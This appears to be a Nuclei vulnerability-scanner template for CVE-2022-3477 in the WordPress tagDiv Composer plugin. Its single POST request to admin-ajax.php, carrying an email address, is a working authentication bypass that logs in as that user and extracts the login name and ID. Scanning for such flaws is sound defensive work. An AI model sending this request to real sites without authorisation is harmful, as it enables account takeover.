id: cve-2022-3477-tagdiv-composer

info:
  name: WordPress tagDiv Composer < 3.5 - Broken Authentication
  author: melmathari
  severity: critical
  description: |
    The tagDiv Composer plugin for WordPress before version 3.5 (bundled with Newspaper < 12.1
    and Newsmag < 5.2.2) contains a broken authentication vulnerability in its Facebook login
    implementation. An attacker can authenticate as any user by knowing their email address.
  reference:
    - https://wpscan.com/vulnerability/993a95d2-6fce-48de-ae17-06ce2db829ef
    - https://nvd.nist.gov/vuln/detail/CVE-2022-3477
  tags: cve,wordpress,auth-bypass,tagdiv,plugin

variables:
  email: "test@nocodeventure.com"

requests:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "action=td_ajax_fb_login_user&user[email]={{email}}"

    matchers:
      - type: word
        part: body
        words:
          - '"success":"You have been successfully'
      - type: regex
        part: body
        regex:
          - '"user_login":"[a-zA-Z0-9_\-]+"'

    extractors:
      - type: regex
        part: body
        name: user_login
        regex:
          - '"user_login":"([a-zA-Z0-9_\-]+)"'
      - type: regex
        part: body
        name: user_id
        regex:
          - '"user_id":"?(\d+)"?'
